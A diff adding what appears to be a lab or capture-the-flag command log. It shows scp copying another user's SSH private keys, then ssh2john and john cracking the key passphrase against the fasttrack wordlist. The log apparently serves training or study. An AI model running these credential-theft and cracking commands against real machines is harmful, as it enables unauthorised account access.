@@ -1,0 +1,25 @@
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:13:08.898Z", "cmd_type": "bash-command", "cmd": "locate"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:13:12.863Z", "cmd_type": "bash-command", "cmd": "locate ssh2john"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:13:47.070Z", "cmd_type": "bash-command", "cmd": "locate ssh2john"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:13:47.225Z", "cmd_type": "bash-command", "cmd": "locate ssh2john"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:14:11.759Z", "cmd_type": "bash-command", "cmd": "locate ssh2john"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:14:44.638Z", "cmd_type": "bash-command", "cmd": "scp root@10.1.26.9:/home/chong/.ssh/Y9yb25h ."}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:15:12.719Z", "cmd_type": "bash-command", "cmd": "scp root@10.1.26.9:/home/chong/.ssh/* ."}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:15:14.218Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:15:36.670Z", "cmd_type": "bash-command", "cmd": "python /usr/share/john/ssh2john.py Y29yb25h >ke.hash"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:15:39.989Z", "cmd_type": "bash-command", "cmd": "cat ke.hash"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:15:47.840Z", "cmd_type": "bash-command", "cmd": "locate rock"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:15:51.664Z", "cmd_type": "bash-command", "cmd": "locate rockyou"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:16:06.938Z", "cmd_type": "bash-command", "cmd": "locate rockyou.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:16:50.573Z", "cmd_type": "bash-command", "cmd": "john ke.hash"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:16:55.127Z", "cmd_type": "bash-command", "cmd": "locate rockyou.txt.gz"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:16:59.913Z", "cmd_type": "bash-command", "cmd": "locate rockyou.txt.gz"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:17:00.536Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:17:15.247Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:17:35.550Z", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:17:40.980Z", "cmd_type": "bash-command", "cmd": "ls /usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:17:46.175Z", "cmd_type": "bash-command", "cmd": "ls -lh /usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:17:58.970Z", "cmd_type": "bash-command", "cmd": "cat /usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:18:07.138Z", "cmd_type": "bash-command", "cmd": "cat /usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:18:24.144Z", "cmd_type": "bash-command", "cmd": "john ke.hash -wordlist=/usr/share/wordlists/fasttrack.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:19:18.316Z", "cmd_type": "bash-command", "cmd": "nc localhost"}
